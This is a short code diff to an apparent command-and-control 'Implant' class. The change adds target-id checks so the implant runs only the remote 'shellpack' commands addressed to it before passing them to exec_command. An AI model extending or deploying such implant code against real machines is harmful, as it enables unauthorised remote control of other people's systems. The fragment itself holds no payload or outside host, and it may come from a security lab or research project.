@@ -64,6 +64,9 @@ class Implant(Host):
         Checks shellpacks for truncated, completed, or none, and passes those on to the exec helper
         """
 
+        if shellpack['target'] != self.id:
+            return
+
         decoded_data = shellpack['data'].decode()
 
         match shellpack['option']:
@@ -80,6 +83,9 @@ class Implant(Host):
         """
         Responds to the instruction command
         """
+
+        if shellpack['target'] != self.id:
+            return
 
         self.exec_command(shellpack['data'].decode())
 
